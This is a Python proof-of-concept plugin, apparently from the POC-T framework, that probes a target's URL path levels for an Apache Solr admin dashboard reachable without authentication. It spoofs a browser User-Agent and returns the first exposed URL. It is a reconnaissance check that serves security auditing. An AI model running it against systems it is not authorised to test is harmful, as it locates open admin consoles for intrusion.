# !/usr/bin/env python
# -*- coding: utf-8 -*-
# author = i@cdxy.me
# project = https://github.com/Xyntax/POC-T

"""
Apache Solr 未授权访问PoC

(iterate_path函数使用教学)

假设输入URL为
  http://cdxy.cdxy.me/hi/hello/cat/a.html?pape=1#
为增加精度，脚本将依次测试以下位置，得到一个结果就返回。
  http://cdxy.cdxy.me/hi/hello/cat/a.html?pape=1#
  http://cdxy.cdxy.me/hi/hello/cat/a.html?pape=1#/solr/
  http://cdxy.cdxy.me/hi/hello/cat/a.html
  http://cdxy.cdxy.me/hi/hello/cat/a.html/solr/
  http://cdxy.cdxy.me/hi/hello/cat
  http://cdxy.cdxy.me/hi/hello/cat/solr/
  http://cdxy.cdxy.me/hi/hello
  http://cdxy.cdxy.me/hi/hello/solr/
  http://cdxy.cdxy.me/hi
  http://cdxy.cdxy.me/hi/solr/
  http://cdxy.cdxy.me
  http://cdxy.cdxy.me/solr/
"""

import requests
from plugin.useragent import firefox
from plugin.urlparser import iterate_path


def poc(target):
    base_url = target if "://" in target else 'http://' + target
    for each in iterate_path(base_url):
        try:
            url = each
            g = requests.get(url, headers={'User-Agent': firefox()})
            if g.status_code is 200 and 'Solr Admin' in g.content and 'Dashboard' in g.content:
                return url
            url = url + '/solr/'
            g = requests.get(url, headers={'User-Agent': firefox()})
            if g.status_code is 200 and 'Solr Admin' in g.content and 'Dashboard' in g.content:
                return url
        except Exception:
            pass
    return False

